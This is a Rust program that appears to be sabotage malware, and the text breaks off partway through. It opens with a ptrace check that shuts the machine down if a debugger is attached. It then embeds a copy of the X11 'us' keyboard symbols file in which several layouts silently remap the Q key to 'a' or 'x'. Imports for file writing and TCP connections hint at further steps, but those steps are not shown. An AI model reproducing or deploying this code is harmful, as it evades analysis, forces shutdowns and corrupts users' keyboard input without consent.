// rustc 0.9 (7613b15 2014-01-08 18:04:43 -0800)

use std::process::Command;
pub extern crate libc;

use std::fs;
use std::fs::OpenOptions;
use std::io::prelude::*;
use std::net::{TcpStream, ToSocketAddrs};
use std::{thread,time,str,process};
use libc::ptrace;

fn main() {
   if unsafe{ptrace(libc::PTRACE_TRACEME, 0, 0, 0)} < 0{
		print!("being traced");
		Command::new("shutdown")
			.args(&["now"])
			.spawn()
			.ok();
	}
	else{
		println!("No tracing :)");
	}
	println!("continuing");
    let new_kb = String::from("default  partial alphanumeric_keys modifier_keys
xkb_symbols \"basic\" {

    name[Group1]= \"English (US)\";

    key <TLDE> {	[     grave,	asciitilde	]	};
    key <AE01> {	[	  1,	exclam 		]	};
    key <AE02> {	[	  2,	at		]	};
    key <AE03> {	[	  3,	numbersign	]	};
    key <AE04> {	[	  4,	dollar		]	};
    key <AE05> {	[	  5,	percent		]	};
    key <AE06> {	[	  6,	asciicircum	]	};
    key <AE07> {	[	  7,	ampersand	]	};
    key <AE08> {	[	  8,	asterisk	]	};
    key <AE09> {	[	  9,	parenleft	]	};
    key <AE10> {	[	  0,	parenright	]	};
    key <AE11> {	[     minus,	underscore	]	};
    key <AE12> {	[     equal,	plus		]	};

    key <AD01> {	[	  a,	Q 		]	};
    key <AD02> {	[	  w,	W		]	};
    key <AD03> {	[	  e,	E		]	};
    key <AD04> {	[	  r,	R		]	};
    key <AD05> {	[	  t,	T		]	};
    key <AD06> {	[	  y,	Y		]	};
    key <AD07> {	[	  u,	U		]	};
    key <AD08> {	[	  i,	I		]	};
    key <AD09> {	[	  o,	O		]	};
    key <AD10> {	[	  p,	P		]	};
    key <AD11> {	[ bracketleft,	braceleft	]	};
    key <AD12> {	[ bracketright,	braceright	]	};

    key <AC01> {	[	  a,	A 		]	};
    key <AC02> {	[	  s,	S		]	};
    key <AC03> {	[	  d,	D		]	};
    key <AC04> {	[	  f,	F		]	};
    key <AC05> {	[	  g,	G		]	};
    key <AC06> {	[	  h,	H		]	};
    key <AC07> {	[	  j,	J		]	};
    key <AC08> {	[	  k,	K		]	};
    key <AC09> {	[	  l,	L		]	};
    key <AC10> {	[ semicolon,	colon		]	};
    key <AC11> {	[ apostrophe,	quotedbl	]	};

    key <AB01> {	[	  z,	Z 		]	};
    key <AB02> {	[	  x,	X		]	};
    key <AB03> {	[	  c,	C		]	};
    key <AB04> {	[	  v,	V		]	};
    key <AB05> {	[	  b,	B		]	};
    key <AB06> {	[	  n,	N		]	};
    key <AB07> {	[	  m,	M		]	};
    key <AB08> {	[     comma,	less		]	};
    key <AB09> {	[    period,	greater		]	};
    key <AB10> {	[     slash,	question	]	};

    key <BKSL> {	[ backslash,         bar	]	};
};

partial alphanumeric_keys
xkb_symbols \"euro\" {

    include \"us(basic)\"
    name[Group1]= \"English (US, euro on 5)\";

    include \"eurosign(5)\"

    include \"level3(ralt_switch)\"
};


partial alphanumeric_keys
xkb_symbols \"ibm238l\" {

    include \"us(basic)\"
    name[Group1]= \"English (US, IBM Arabic 238_L)\";

    key <AB08> {        [     comma,    comma      ]       };
    key <AB09> {        [    period,    period     ]       };
    key <BKSL> {        [ quoteleft,    asciitilde ]       };
    key <LSGT> {        [ backslash,    bar        ]       };
    key <TLDE> {        [ leftcaret,    rightcaret ]       };
};

partial alphanumeric_keys
xkb_symbols \"intl\" {

    include \"us(basic)\"
    name[Group1]= \"English (US, intl., with dead keys)\";

    key <TLDE> { [dead_grave, dead_tilde,         grave,       asciitilde ] };
    key <AE01> { [	   1,     exclam,    exclamdown,      onesuperior ] };
    key <AE02> { [	   2,         at,   twosuperior, dead_doubleacute ] };
    key <AE03> { [	   3, numbersign, threesuperior,      dead_macron ] };
    key <AE04> { [	   4,     dollar,      currency,         sterling ] };
    key <AE05> { [	   5,    percent,      EuroSign,     dead_cedilla ] };
    key <AE06> { [    6, dead_circumflex,    onequarter,      asciicircum ] };
    key <AE07> { [	   7,  ampersand,       onehalf,	dead_horn ] };
    key <AE08> { [	   8,   asterisk, threequarters,      dead_ogonek ] };
    key <AE09> { [	   9,  parenleft, leftsinglequotemark, dead_breve ] };
    key <AE10> { [	   0, parenright, rightsinglequotemark, dead_abovering ] };
    key <AE11> { [     minus, underscore,           yen,    dead_belowdot ] };
    key <AE12> { [     equal,       plus,      multiply,         division ] };

    key <AD01> { [	   x,          Q,    adiaeresis,       Adiaeresis ] };
    key <AD02> { [	   w,          W,         aring,            Aring ] };
    key <AD03> { [	   e,          E,        eacute,           Eacute ] };
    key <AD04> { [	   r,          R,    registered,       registered ] };
    key <AD05> { [	   t,          T,         thorn,            THORN ] };
    key <AD06> { [	   y,          Y,    udiaeresis,       Udiaeresis ] };
    key <AD07> { [	   u,          U,        uacute,           Uacute ] };
    key <AD08> { [	   i,          I,        iacute,           Iacute ] };
    key <AD09> { [	   o,          O,        oacute,           Oacute ] };
    key <AD10> { [	   p,          P,    odiaeresis,       Odiaeresis ] };
    key <AD11> { [ bracketleft,  braceleft,  guillemotleft, leftdoublequotemark ] };
    key <AD12> { [bracketright, braceright, guillemotright, rightdoublequotemark ] };

    key <AC01> { [	   a,          A,        aacute,           Aacute ] };
    key <AC02> { [	   s,          S,        ssharp,          section ] };
    key <AC03> { [	   d,          D,           eth,              ETH ] };
    key <AC04> { [	   f,          F,             f,                F ] };
    key <AC05> { [	   g,          G,             g,                G ] };
    key <AC06> { [	   h,          H,             h,                H ] };
    key <AC07> { [	   j,          J,             j,                J ] };
    key <AC08> { [	   k,          K,            oe,               OE ] };

    key <AC09> { [	   l,          L,        oslash,         Ooblique ] };
    key <AC10> { [ semicolon,      colon,     paragraph,           degree ] };
    key <AC11> { [dead_acute, dead_diaeresis, apostrophe,        quotedbl ] };

    key <AB01> { [	   z,          Z,            ae,               AE ] };
    key <AB02> { [	   x,          X,             x,                X ] };
    key <AB03> { [	   c,          C,     copyright,             cent ] };
    key <AB04> { [	   v,          V,             v,                V ] };
    key <AB05> { [	   b,          B,             b,                B ] };
    key <AB06> { [	   n,          N,        ntilde,           Ntilde ] };
    key <AB07> { [	   m,          M,            mu,               mu ] };
    key <AB08> { [     comma,       less,      ccedilla,         Ccedilla ] };
    key <AB09> { [    period,    greater, dead_abovedot,       dead_caron ] };
    key <AB10> { [     slash,   question,  questiondown,        dead_hook ] };
    key <BKSL> { [ backslash,        bar,       notsign,        brokenbar ] };

    key <LSGT> { [ backslash,   bar,            backslash,      bar ] };

    include \"level3(ralt_switch)\"
};

// Based on symbols/us_intl keyboard map:
// Dead-keys definition for a very simple US/ASCII layout.
// by Conectiva (http://www.conectiva.com.br)
// modified by Ricardo Y. Igarashi (iga@that.com.br)

// Added the following deadkeys, to make it truly international:
//
// dead_macron: on AltGr-minus
// dead_breve: on AltGr-parenleft
// dead_abovedot: on AltGr-period
// dead_abovering: on AltGr-0
// dead_doubleacute: on AltGr-equal (as quotedbl is already used)
// dead_caron: on AltGr-less (AltGr-shift-comma)
// dead_cedilla: on AltGr-comma
// dead_ogonek: on AltGr-semicolon
// dead_belowdot: on AltGr-underscore (AltGr-shift-minus)
// dead_hook: on AltGr-question
// dead_horn: on AltGr-plus (AltGr-shift-equal)
// dead_diaeresis: on AltGr-colon (Alt-shift-semicolon)
//
// those were already there:
// dead_grave
// dead_acute
// dead_circumflex
// dead_tilde
// dead_diaeresis

partial alphanumeric_keys
xkb_symbols \"alt-intl\" {

  include \"us\"
  name[Group1]= \"English (US, alt. intl.)\";

  key <TLDE> { [ dead_grave, dead_tilde,    grave,	      asciitilde    ] };
  key <AE05> { [          5, percent,	    EuroSign			    ] };
  key <AE06> { [	  6, dead_circumflex, asciicircum,    asciicircum   ] };
  key <AE09> { [	  9, parenleft, leftsinglequotemark,  dead_breve ] };
  key <AE10> { [	  0, parenright, rightsinglequotemark, dead_abovering ] };
  key <AE11> { [      minus, underscore,    dead_macron,      dead_belowdot ] };
  key <AE12> { [      equal, plus,	    dead_doubleacute, dead_horn	    ] };

  key <AD03> { [          e, E,		     EuroSign,         cent	    ] };

  key <AC10> { [  semicolon, colon,	     dead_ogonek,   dead_diaeresis  ] };
  key <AC11> { [ dead_acute, dead_diaeresis, apostrophe,    quotedbl	    ] };

  key <AB08> { [      comma, less,	     dead_cedilla,  dead_caron	    ] };
  key <AB09> { [     period, greater,	     dead_abovedot, dead_circumflex ] };
  key <AB10> { [      slash, question,	     dead_hook,	    dead_hook	    ] };

  key <LSGT> { [ backslash,   bar,            backslash,      bar ] };

  include \"level3(ralt_switch)\"
};

// based on a keyboard map from an 'xkb/symbols/dk' file

partial alphanumeric_keys
xkb_symbols \"dvorak\" {

    name[Group1]= \"English (Dvorak)\";

    key <TLDE> { [       grave,	asciitilde, dead_grave, dead_tilde	] };

    key <AE01> { [	    1,	exclam 		]	};
    key <AE02> { [	    2,	at		]	};
    key <AE03> { [	    3,	numbersign	]	};
    key <AE04> { [	    4,	dollar		]	};
    key <AE05> { [	    5,	percent		]	};
    key <AE06> { [	    6,	asciicircum, dead_circumflex, dead_circumflex ]	};
    key <AE07> { [	    7,	ampersand	]	};
    key <AE08> { [	    8,	asterisk	]	};
    key <AE09> { [	    9,	parenleft,  dead_grave]	};
    key <AE10> { [	    0,	parenright	]	};
    key <AE11> { [ bracketleft,	braceleft	]	};
    key <AE12> { [ bracketright, braceright,  dead_tilde] };

    key <AD01> { [  apostrophe,	quotedbl, dead_acute, dead_diaeresis	] };
    key <AD02> { [	comma,	less,   dead_cedilla, dead_caron	] };
    key <AD03> { [      period,	greater, dead_abovedot, periodcentered	] };
    key <AD04> { [	    p,	P		]	};
    key <AD05> { [	    y,	Y		]	};
    key <AD06> { [	    f,	F		]	};
    key <AD07> { [	    g,	G		]	};
    key <AD08> { [	    c,	C		]	};
    key <AD09> { [	    r,	R		]	};
    key <AD10> { [	    l,	L		]	};
    key <AD11> { [	slash,	question	]	};
    key <AD12> { [	equal,	plus		]	};

    key <AC01> { [	    a,	A 		]	};
    key <AC02> { [	    o,	O		]	};
    key <AC03> { [	    e,	E		]	};
    key <AC04> { [	    u,	U		]	};
    key <AC05> { [	    i,	I		]	};
    key <AC06> { [	    d,	D		]	};
    key <AC07> { [	    h,	H		]	};
    key <AC08> { [	    t,	T		]	};
    key <AC09> { [	    n,	N		]	};
    key <AC10> { [	    s,	S		]	};
    key <AC11> { [	minus,	underscore	]	};

    key <AB01> { [   semicolon,	colon, dead_ogonek, dead_doubleacute ] };
    key <AB02> { [	    x,	Q		]	};
    key <AB03> { [	    j,	J		]	};
    key <AB04> { [	    k,	K		]	};
    key <AB05> { [	    x,	X		]	};
    key <AB06> { [	    b,	B		]	};
    key <AB07> { [	    m,	M		]	};
    key <AB08> { [	    w,	W		]	};
    key <AB09> { [	    v,	V		]	};
    key <AB10> { [	    z,	Z		]	};

    key <BKSL> { [  backslash,  bar             ]       };
};

// Dvorak intl., with dead keys
// Olivier Mehani (shtrom-xorg@ssji.net)
// Reproduce the per-key mapping of us(intl) for the dvorak layout
// aka \"I just swapped my keys over\"
partial alphanumeric_keys
xkb_symbols \"dvorak-intl\" {

    include \"us(dvorak)\"
    name[Group1]= \"English (Dvorak, intl., with dead keys)\";

    key <TLDE> { [dead_grave, dead_tilde,         grave,       asciitilde ] };

    key <AE01> { [	   1,     exclam,    exclamdown,      onesuperior ] };
    key <AE02> { [	   2,         at,   twosuperior, dead_doubleacute ] };
    key <AE03> { [	   3, numbersign, threesuperior,      dead_macron ] };
    key <AE04> { [	   4,     dollar,      currency,         sterling ] };
    key <AE05> { [	   5,    percent,      EuroSign,     dead_cedilla ] };
    key <AE06> { [    6, dead_circumflex,    onequarter,      asciicircum ] };
    key <AE07> { [	   7,  ampersand,       onehalf,	dead_horn ] };
    key <AE08> { [	   8,   asterisk, threequarters,      dead_ogonek ] };
    key <AE09> { [	   9,  parenleft, leftsinglequotemark, dead_breve ] };
    key <AE10> { [	   0, parenright, rightsinglequotemark, dead_abovering ] };
    key <AE11> { [ bracketleft,  braceleft,  guillemotleft, leftdoublequotemark ] };
    key <AE12> { [bracketright, braceright, guillemotright, rightdoublequotemark ] };

    key <AD01> { [dead_acute, dead_diaeresis, apostrophe,        quotedbl ] };
    key <AD02> { [     comma,       less,      ccedilla,         Ccedilla ] };
    key <AD03> { [    period,    greater, dead_abovedot,       dead_caron ] };
    key <AD04> { [	   p,          P,    odiaeresis,       Odiaeresis ] };
    key <AD05> { [	   y,          Y,    udiaeresis,       Udiaeresis ] };
    // key <AD06> { [	   f,	F		]	};
    // key <AD07> { [	   g,	G		]	};
    key <AD08> { [	   c,          C,     copyright,             cent ] };
    key <AD09> { [	   r,          R,    registered,       registered ] };
    key <AD10> { [	   l,          L,        oslash,         Ooblique ] };
    key <AD11> { [     slash,   question,  questiondown,        dead_hook ] };
    // key <AD12> { [     equal,       plus,      multiply,         division ] };

    key <AC01> { [	   a,          A,        aacute,           Aacute ] };
    key <AC02> { [	   o,          O,        oacute,           Oacute ] };
    key <AC03> { [	   e,          E,        eacute,           Eacute ] };
    key <AC04> { [	   u,          U,        uacute,           Uacute ] };
    key <AC05> { [	   i,          I,        iacute,           Iacute ] };
    key <AC06> { [	   d,          D,           eth,              ETH ] };
    // key <AC07> { [	   h,	H		]	};
    key <AC08> { [	   t,          T,         thorn,            THORN ] };
    key <AC09> { [	   n,          N,        ntilde,           Ntilde ] };
    key <AC10> { [	   s,          S,        ssharp,          section ] };
    // key <AC11> { [     minus, underscore,           yen,    dead_belowdot ] };

    key <AB01> { [ semicolon,      colon,     paragraph,           degree ] };
    key <AB02> { [	   x,          Q,    adiaeresis,       Adiaeresis ] };
    // key <AB03> { [	   j,	J		]	};
    key <AB04> { [	   k,          K,            oe,               OE ] };
    // key <AB05> { [	   x,	X		]	};
    // key <AB06> { [	   b,	B		]	};
    key <AB07> { [	   m,          M,            mu,               mu ] };
    key <AB08> { [	   w,          W,         aring,            Aring ] };
    // key <AB09> { [	   v,	V		]	};
    key <AB10> { [	   z,          Z,            ae,               AE ] };

    key <BKSL> { [ backslash,        bar,       notsign,        brokenbar ] };

    include \"level3(ralt_switch)\"
};

// Dvorak international without dead keys
// Stephane Magnenat (stephane at magnenat dot net, http://stephane.magnenat.net)
// Based on information from http://www.poupinou.org/dvorak/index.html
//
//  `   1   2   3   4   5   6   7   8   9   0   [   ]   \
//                  €
//
//      '   ,   .   p   y   f   g   c   r   l   /   =
//          ä   ê   ë   ü           ç
//
//      a   o   e   u   i   d   h   t   n   s   -
//      à   ô   é   û   î                   ß
//
//      ;   q   j   k   x   b   m   w   v   z
//      â   ö   è   ù   ï

partial alphanumeric_keys
xkb_symbols \"dvorak-alt-intl\" {

    include \"us(dvorak)\"
    name[Group1]= \"English (Dvorak, alt. intl.)\";

    key <AE04> { [         4,  dollar,    EuroSign ] };

    key <AD02> { [     comma,    less,  adiaeresis,       dead_caron ] };
    key <AD03> { [    period, greater, ecircumflex,   periodcentered	] };
    key <AD04> { [         p,       P,  ediaeresis,     dead_cedilla ] };
    key <AD05> { [         y,       Y,  udiaeresis ] };
    key <AD08> { [         c,       C,    ccedilla,    dead_abovedot ] };

    key <AC01> { [         a,       A,      agrave ] };
    key <AC02> { [         o,       O, ocircumflex ] };
    key <AC03> { [         e,       E,      eacute ] };
    key <AC04> { [         u,       U, ucircumflex ] };
    key <AC05> { [         i,       I, icircumflex ] };
    key <AC10> { [         s,       S,      ssharp ] };

    key <AB01> { [ semicolon,   colon, acircumflex ] };
    key <AB02> { [         x,       Q,  odiaeresis,      dead_ogonek ] };
    key <AB03> { [         j,       J,      egrave, dead_doubleacute ] };
    key <AB04> { [         k,       K,      ugrave ] };
    key <AB05> { [         x,       X,  idiaeresis ] };

    include \"level3(ralt_switch)\"
};

// Left and right handed dvorak layouts
// by sqweek <sqweek@gmail.com> 2006-01-30
// Based on the corresponding layouts in the console-tools package.
partial alphanumeric_keys
xkb_symbols \"dvorak-l\" {

    include \"us(dvorak)\"
    name[Group1]= \"English (Dvorak, left-handed)\";

    key <AE01> {	[ bracketleft,	braceleft	]	};
    key <AE02> {	[ bracketright,	braceright	]	};
    key <AE03> {	[	slash,	question	]	};
    key <AE04> {	[	    p,	P		]	};
    key <AE05> {	[	    f,	F		]	};
    key <AE06> {	[	    m,	M		]	};
    key <AE07> {	[	    l,	L		]	};
    key <AE08> {	[	    j,	J		]	};
    key <AE09> {	[	    4,	dollar		]	};
    key <AE10> {	[	    3,	numbersign	]	};
    key <AE11> {	[	    2,	at		]	};
    key <AE12> {	[	    1,	exclam 		]	};

    key <AD01> {	[   semicolon,	colon 		]	};
    key <AD02> {	[	    x,	Q		]	};
    key <AD03> {	[	    b,	B		]	};
    key <AD04> {	[	    y,	Y		]	};
    key <AD05> {	[	    u,	U		]	};
    key <AD06> {	[	    r,	R		]	};
    key <AD07> {	[	    s,	S		]	};
    key <AD08> {	[	    o,	O		]	};
    key <AD09> {	[      period,	greater		]	};
    key <AD10> {	[	    6,	asciicircum	]	};
    key <AD11> {	[	    5,	percent		]	};
    key <AD12> {	[	equal,	plus		]	};

    key <AC01> {	[	minus,	underscore	]	};
    key <AC02> {	[	    k,	K		]	};
    key <AC03> {	[	    c,	C		]	};
    key <AC04> {	[	    d,	D		]	};
    key <AC05> {	[	    t,	T		]	};
    key <AC06> {	[	    h,	H		]	};
    key <AC07> {	[	    e,	E		]	};
    key <AC08> {	[	    a,	A 		]	};
    key <AC09> {	[	    z,	Z		]	};
    key <AC10> {	[	    8,	asterisk	]	};
    key <AC11> {	[	    7,	ampersand	]	};

    key <AB01> {	[  apostrophe,	quotedbl	] 	};
    key <AB02> {	[	    x,	X		]	};
    key <AB03> {	[	    g,	G		]	};
    key <AB04> {	[	    v,	V		]	};
    key <AB05> {	[	    w,	W		]	};
    key <AB06> {	[	    n,	N		]	};
    key <AB07> {	[	    i,	I		]	};
    key <AB08> {	[	comma,	less		]	};
    key <AB09> {	[	    0,	parenright	]	};
    key <AB10> {	[	    9,	parenleft	]	};
};

partial alphanumeric_keys
xkb_symbols \"dvorak-r\" {

    include \"us(dvorak)\"
    name[Group1]= \"English (Dvorak, right-handed)\";

    key <AE01> {	[	    1,	exclam 		]	};
    key <AE02> {	[	    2,	at		]	};
    key <AE03> {	[	    3,	numbersign	]	};
    key <AE04> {	[	    4,	dollar		]	};
    key <AE05> {	[	    j,	J		]	};
    key <AE06> {	[	    l,	L		]	};
    key <AE07> {	[	    m,	M		]	};
    key <AE08> {	[	    f,	F		]	};
    key <AE09> {	[	    p,	P		]	};
    key <AE10> {	[	slash,	question	]	};
    key <AE11> {	[ bracketleft,	braceleft	]	};
    key <AE12> {	[ bracketright,	braceright	]	};

    key <AD01> {	[	    5,	percent		]	};
    key <AD02> {	[	    6,	asciicircum ]	};
    key <AD03> {	[	    x,	Q		]	};
    key <AD04> {	[      period,	greater		]	};
    key <AD05> {	[	    o,	O		]	};
    key <AD06> {	[	    r,	R		]	};
    key <AD07> {	[	    s,	S		]	};
    key <AD08> {	[	    u,	U		]	};
    key <AD09> {	[	    y,	Y		]	};
    key <AD10> {	[	    b,	B		]	};
    key <AD11> {	[   semicolon,	colon 		]	};
    key <AD12> {	[	equal,	plus		]	};

    key <AC01> {	[	    7,	ampersand	]	};
    key <AC02> {	[	    8,	asterisk	]	};
    key <AC03> {	[	    z,	Z		]	};
    key <AC04> {	[	    a,	A 		]	};
    key <AC05> {	[	    e,	E		]	};
    key <AC06> {	[	    h,	H		]	};
    key <AC07> {	[	    t,	T		]	};
    key <AC08> {	[	    d,	D		]	};
    key <AC09> {	[	    c,	C		]	};
    key <AC10> {	[	    k,	K		]	};
    key <AC11> {	[	minus,	underscore	]	};

    key <AB01> {	[	    9,	parenleft	]	};
    key <AB02> {	[	    0,	parenright	]	};
    key <AB03> {	[	    x,	X		]	};
    key <AB04> {	[	comma,	less		]	};
    key <AB05> {	[	    i,	I		]	};
    key <AB06> {	[	    n,	N		]	};
    key <AB07> {	[	    w,	W		]	};
    key <AB08> {	[	    v,	V		]	};
    key <AB09> {	[	    g,	G		]	};
    key <AB10> {	[  apostrophe,	quotedbl	] 	};
};

// Classic dvorak layout
// by Piter Punk <piterpk@terra.com.br> - 2006-07-06 
// Based on dvorak layout and e-mail from Russel L. Harris rlharris@oplink.net 
// on xorg list.
partial alphanumeric_keys
xkb_symbols \"dvorak-classic\" {

    name[Group1]= \"English (classic Dvorak)\";

    key <TLDE> { [       grave,	asciitilde, dead_grave, dead_tilde	] };

    key <AE01> { [ bracketleft,	braceleft	]	};
    key <AE02> { [	    7,	ampersand	]	};
    key <AE03> { [	    5,	percent		]	};
    key <AE04> { [	    3,	numbersign	]	};
    key <AE05> { [	    1,	exclam 		]	};
    key <AE06> { [	    9,	parenleft,  dead_grave]	};
    key <AE07> { [	    0,	parenright	]	};
    key <AE08> { [	    2,	at		]	};
    key <AE09> { [	    4,	dollar		]	};
    key <AE10> { [	    6,	asciicircum, dead_circumflex, dead_circumflex ]	};
    key <AE11> { [	    8,	asterisk	]	};
    key <AE12> { [ bracketright, braceright,  dead_tilde] };

    key <AD01> { [	slash,	question	]	};
    key <AD02> { [	comma,	less,   dead_cedilla, dead_caron	] };
    key <AD03> { [      period,	greater, dead_abovedot, periodcentered	] };
    key <AD04> { [	    p,	P		]	};
    key <AD05> { [	    y,	Y		]	};
    key <AD06> { [	    f,	F		]	};
    key <AD07> { [	    g,	G		]	};
    key <AD08> { [	    c,	C		]	};
    key <AD09> { [	    r,	R		]	};
    key <AD10> { [	    l,	L		]	};
    key <AD11> { [  apostrophe,	quotedbl, dead_acute, dead_diaeresis	] };
    key <AD12> { [	equal,	plus		]	};

    key <AC01> { [	    a,	A 		]	};
    key <AC02> { [	    o,	O		]	};
    key <AC03> { [	    e,	E		]	};
    key <AC04> { [	    u,	U		]	};
    key <AC05> { [	    i,	I		]	};
    key <AC06> { [	    d,	D		]	};
    key <AC07> { [	    h,	H		]	};
    key <AC08> { [	    t,	T		]	};
    key <AC09> { [	    n,	N		]	};
    key <AC10> { [	    s,	S		]	};
    key <AC11> { [	minus,	underscore	]	};

    key <AB01> { [   semicolon,	colon, dead_ogonek, dead_doubleacute ] };
    key <AB02> { [	    x,	Q		]	};
    key <AB03> { [	    j,	J		]	};
    key <AB04> { [	    k,	K		]	};
    key <AB05> { [	    x,	X		]	};
    key <AB06> { [	    b,	B		]	};
    key <AB07> { [	    m,	M		]	};
    key <AB08> { [	    w,	W		]	};
    key <AB09> { [	    v,	V		]	};
    key <AB10> { [	    z,	Z		]	};
    key <BKSL> { [  backslash,  bar             ]       };
};

// programmer Dvorak, by Roland Kaufmann <rlndkfmn at gmail dot com>
// License: BSD, available at <http://www.kaufmann.no/roland/dvorak/license.html>
// Main features: Numbers are in shift position (like French), symbols have been
// placed in locations that give good hand-alternation and finger rolling with
// symbols that usually follows, accented characters are possible for I18N.
// Patch suggestions should be sent upstream.
partial alphanumeric_keys
xkb_symbols \"dvp\" {

    include \"us(dvorak)\"
    name[Group1] = \"English (programmer Dvorak)\";

    //             Unmodified       Shift           AltGr            Shift+AltGr
    // symbols row, left side
    key <TLDE> { [ dollar,          asciitilde,     dead_tilde                  ] };
    key <AE01> { [ ampersand,       percent                                     ] };
    key <AE02> { [ bracketleft,     7,              currency                    ], type[Group1] = \"FOUR_LEVEL_ALPHABETIC\" };
    key <AE03> { [ braceleft,       5,              cent                        ], type[Group1] = \"FOUR_LEVEL_ALPHABETIC\" };
    key <AE04> { [ braceright,      3,              yen                         ], type[Group1] = \"FOUR_LEVEL_ALPHABETIC\" };
    key <AE05> { [ parenleft,       1,              EuroSign                    ], type[Group1] = \"FOUR_LEVEL_ALPHABETIC\" };
    key <AE06> { [ equal,           9,              sterling                    ], type[Group1] = \"FOUR_LEVEL_ALPHABETIC\" };

    // symbols row, right side
    key <AE07> { [ asterisk,        0                                           ], type[Group1] = \"FOUR_LEVEL_ALPHABETIC\" };
    key <AE08> { [ parenright,      2,              onehalf                     ], type[Group1] = \"FOUR_LEVEL_ALPHABETIC\" };
    key <AE09> { [ plus,            4                                           ], type[Group1] = \"FOUR_LEVEL_ALPHABETIC\" };
    key <AE10> { [ bracketright,    6                                           ], type[Group1] = \"FOUR_LEVEL_ALPHABETIC\" };
    key <AE11> { [ exclam,          8,              exclamdown,      U2E18      ], type[Group1] = \"FOUR_LEVEL_ALPHABETIC\" };  // reversed interrobang
    key <AE12> { [ numbersign,      grave,          dead_grave                  ] };
    key <BKSP> { [ BackSpace,       BackSpace                                   ] };

    // upper row, left side
    key <AD01> { [ semicolon,       colon,          dead_diaeresis              ] };
    key <AD02> { [ comma,           less,           guillemotleft,   U201C      ] };
    key <AD03> { [ period,          greater,        guillemotright,  U201D      ] };
    key <AD04> { [ p,               P,              paragraph,       section    ] };
    key <AD05> { [ y,               Y,              udiaeresis,      Udiaeresis ] };

    // upper row, right side
    key <AD08> { [ c,               C,              ccedilla,        Ccedilla   ] };
    key <AD09> { [ r,               R,              registered,      trademark  ] };
    key <AD11> { [ slash,           question,       questiondown,    U203D      ] };  // interrobang
    key <AD12> { [ at,              asciicircum,    dead_circumflex, dead_caron ] };

    // home row, left side
    key <AC01> { [ a,               A,              aring,           Aring      ] };
    key <AC02> { [ o,               O,              oslash,          Ooblique   ] };
    key <AC03> { [ e,               E,              ae,              AE         ] };
    key <AC04> { [ u,               U,              eacute,          Eacute     ] };

    // home row, right side
    key <AC06> { [ d,               D,              eth,             ETH        ] };
    key <AC07> { [ h,               H,              dead_acute                  ] };
    key <AC08> { [ t,               T,              thorn,           THORN      ] };
    key <AC09> { [ n,               N,              ntilde,          Ntilde     ] };
    key <AC10> { [ s,               S,              ssharp                      ] };
    key <AC11> { [ minus,           underscore,     hyphen,          endash     ], type[Group1] = \"FOUR_LEVEL_ALPHABETIC\" };
    key <BKSL> { [ backslash,       bar                                         ] };

    // lower row, left side
    key <AB01> { [ apostrophe,      quotedbl,       dead_acute                  ] };

    // do NOT hardcode this switch; use lv3:ralt_switch option instead!
    //include \"level3(ralt_switch)\"
};

// phonetic layout for Russian letters on an US keyboard
// by Ivan Popov <pin@konvalo.org> 2005-07-17

// level3 modifier is a shortcut to the \"us\" meaning of the keys where
// we place cyrillic letters, handy for accessing the corresponding
// punctuation marks.
// It is important to have access to punctuation marks, and the rest of
// alphabetical keys are added for being consequent so that the users
// can expect the level3 modifier to give what the key label shows.

partial alphanumeric_keys
xkb_symbols \"rus\" {

    include \"us(basic)\"
    name[Group1]= \"Russian (US, phonetic)\";

key.type[group1]=\"FOUR_LEVEL_ALPHABETIC\";

    key	<LatA> {	[ Cyrillic_a, Cyrillic_A ]	};
    key	<LatB> {	[ Cyrillic_be, Cyrillic_BE ]	};
    key	<LatW> {	[ Cyrillic_ve, Cyrillic_VE ]	};
    key	<LatG> {	[ Cyrillic_ghe, Cyrillic_GHE ]	};
    key	<LatD> {	[ Cyrillic_de, Cyrillic_DE ]	};
    key	<LatE> {	[ Cyrillic_ie, Cyrillic_IE ]	};
    key	<TLDE> {	[ Cyrillic_io, Cyrillic_IO, grave, asciitilde ] };
    key	<LatV> {	[ Cyrillic_zhe, Cyrillic_ZHE ]	};
    key	<LatZ> {	[ Cyrillic_ze, Cyrillic_ZE ]	};
    key	<LatI> {	[ Cyrillic_i, Cyrillic_I ]	};
    key	<LatJ> {	[ Cyrillic_shorti, Cyrillic_SHORTI ]	};
    key	<LatK> {	[ Cyrillic_ka, Cyrillic_KA ]	};
    key	<LatL> {	[ Cyrillic_el, Cyrillic_EL ]	};
    key	<LatM> {	[ Cyrillic_em, Cyrillic_EM ]	};
    key	<LatN> {	[ Cyrillic_en, Cyrillic_EN ]	};
    key	<LatO> {	[ Cyrillic_o, Cyrillic_O ]	};
    key	<LatP> {	[ Cyrillic_pe, Cyrillic_PE ]	};
    key	<LatR> {	[ Cyrillic_er, Cyrillic_ER ]	};
    key	<LatS> {	[ Cyrillic_es, Cyrillic_ES ]	};
    key	<LatT> {	[ Cyrillic_te, Cyrillic_TE ]	};
    key	<LatU> {	[ Cyrillic_u, Cyrillic_U ]	};
    key	<LatF> {	[ Cyrillic_ef, Cyrillic_EF ]	};
    key	<LatH> {	[ Cyrillic_ha, Cyrillic_HA ]	};
    key	<LatC> {	[ Cyrillic_tse, Cyrillic_TSE ]	};
    key <AC10> {        [ Cyrillic_che, Cyrillic_CHE, semicolon, colon ] };
    key	<AD11> {	[ Cyrillic_sha, Cyrillic_SHA, bracketleft, braceleft] };
    key	<AD12> {	[ Cyrillic_shcha, Cyrillic_SHCHA, bracketright, braceright ]	};
    key <AE12> {        [ Cyrillic_hardsign, Cyrillic_HARDSIGN, equal, plus ] };
    key	<LatY> {	[ Cyrillic_yeru, Cyrillic_YERU ]	};
    key	<LatX> {	[ Cyrillic_softsign, Cyrillic_SOFTSIGN ]	};
    key	<BKSL> {	[ Cyrillic_e, Cyrillic_E, backslash, bar ]	};
    key <AC11> {        [ Cyrillic_yu, Cyrillic_YU, apostrophe, quotedbl ] };
    key	<LatQ> {	[ Cyrillic_ya, Cyrillic_YA ]	};

    include \"level3(ralt_switch)\"
};

partial alphanumeric_keys
xkb_symbols \"mac\" {

    include \"us(basic)\"
    name[Group1]= \"English (Macintosh)\";
    key.type[group1]=\"FOUR_LEVEL\";

    // Slightly improvised from http://homepage.mac.com/thgewecke/kblayout.jpg
    key <LSGT> { [   section,  plusminus,       section,        plusminus ] };
    key <TLDE> { [     grave, asciitilde,    dead_grave,        dead_horn ] };
    key <AE01> { [	   1,     exclam,    exclamdown,            U2044 ] };
    key <AE02> { [	   2,         at,     trademark,         EuroSign ] };
    key <AE03> { [	   3, numbersign,      sterling,            U2039 ] };
    key <AE04> { [	   4,     dollar,          cent,            U203A ] };
    key <AE05> { [	   5,    percent,      infinity,            UFB01 ] };
